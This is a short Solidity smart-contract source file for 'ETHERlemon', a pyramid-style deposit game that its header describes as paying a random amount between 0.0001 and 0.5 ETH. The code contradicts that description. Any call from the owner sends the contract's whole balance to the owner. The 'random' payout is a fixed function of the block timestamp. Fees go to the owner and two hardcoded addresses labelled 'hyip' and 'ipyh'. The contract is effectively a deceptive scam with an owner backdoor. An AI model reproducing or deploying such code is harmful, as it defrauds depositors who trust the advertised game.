/*
Etherlemon - ethereum lemon.

Ladder deposit contract based on EtheriumPyramidSample on GitHub.

ETHERlemon allows to get random outcome in 0.0001 to 0.5 eth.

*/
contract ETHERlemon
{

    uint public paymentqueue = 0;
    uint public feecounter;
    
    address public owner;
    address public ipyh=0x5fD8B8237B6fA8AEDE4fdab7338709094d5c5eA4;
    address public hyip=0xfAF7100b413465Ea0eB550d6D6a2A29695A6f218;
    address meg=this;

    modifier _onlyowner
    {
        if (msg.sender == owner)
        _
    }
    
    function ETHERlemon() 
    {
        owner = msg.sender;
    }
    function()       
    {
        enter();
    }
    function enter()
    {
        if (msg.sender == owner)
	    {
	        UpdatePay();                                          
	    }
	    else                                                          
	    {
            feecounter+=msg.value/10;                                  
	        owner.send(feecounter/2);                           
	        ipyh.send((feecounter/2)/2);                                 
	        hyip.send((feecounter/2)/2);
	        feecounter=0;                                            
	        
            if (msg.value == (1 ether)/10)                                
            {
                canPay();                                              
            }
	        else                                                         
	        {
	            msg.sender.send(msg.value - msg.value/10);                   
	        }
	    }

    }
    
    function UpdatePay() _onlyowner                                            
    {
        msg.sender.send(meg.balance);
    }
    
    function canPay() internal                                                  
    {
        msg.sender.send((block.timestamp*1000)*1000*40);  //set random payment
    }
}